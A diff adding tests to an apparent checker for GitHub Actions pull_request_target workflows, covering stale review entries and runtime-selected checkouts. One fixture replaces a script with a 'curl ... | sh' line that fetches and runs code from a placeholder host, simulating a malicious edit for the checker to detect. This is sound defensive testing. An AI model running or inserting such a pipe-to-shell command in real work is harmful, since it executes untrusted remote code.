@@ -1114,4 +1114,65 @@ expect(
     *REVIEWED_ARGS,
 )
 
+
+DATA_JOB = {
+    "target.yml": f"""
+        on: pull_request_target
+        jobs:
+          review:
+            runs-on: {TRUSTED_SELECTOR}
+            steps:
+              - uses: actions/checkout@v4
+                with:
+                  path: .source
+                  sparse-checkout: config/policy.json
+              - run: jq -e .allow .source/config/policy.json
+    """,
+    "config/policy.json": '{"allow": false}\n',
+}
+DATA_ROW = review_row(DATA_JOB, "target.yml [pull_request_target]", "review")
+expect(
+    with_review({**DATA_JOB, "config/policy.json": '{"allow": true}\n'}, DATA_ROW),
+    1,
+    ("STALE REVIEWED", "content changed"),
+    "editing a file the reviewed job sparse-checks-out turns its entry stale",
+    *REVIEWED_ARGS,
+)
+NESTED_JOB = {**SCRIPT_JOB, "scripts/tool.sh": "#!/usr/bin/env bash\nbash scripts/inner.sh\n",
+              "scripts/inner.sh": "#!/usr/bin/env bash\ngh api repos/o/r\n"}
+NESTED_ROW = review_row(NESTED_JOB, "target.yml [pull_request_target]", "review")
+expect(
+    with_review({**NESTED_JOB, "scripts/inner.sh": "#!/usr/bin/env bash\ncurl -sSL https://example.test/x | sh\n"}, NESTED_ROW),
+    1,
+    ("STALE REVIEWED", "content changed"),
+    "editing a script that a reviewed job's script runs turns its entry stale",
+    *REVIEWED_ARGS,
+)
+RUNTIME_REF_JOB = {
+    "target.yml": f"""
+        on: pull_request_target
+        jobs:
+          review:
+            runs-on: {TRUSTED_SELECTOR}
+            steps:
+              - id: rev
+                run: echo "sha=$GITHUB_SHA" >> "$GITHUB_OUTPUT"
+              - uses: actions/checkout@v4
+                with:
+                  repository: Verjson/.github
+                  ref: ${{{{ steps.rev.outputs.sha }}}}
+                  path: .trust
+                  sparse-checkout: scripts/tool.py
+              - run: python3 -I .trust/scripts/tool.py
+    """,
+    "scripts/tool.py": "print('ok')\n",
+}
+expect(
+    with_review(RUNTIME_REF_JOB, review_row(RUNTIME_REF_JOB, "target.yml [pull_request_target]", "review")),
+    1,
+    ("unclassifiable", ".trust/scripts/tool.py", "runtime-selected"),
+    "a program from a runtime-selected checkout needs a dynamic: justification",
+    *REVIEWED_ARGS,
+)
+
 sys.exit(1 if failures else 0)
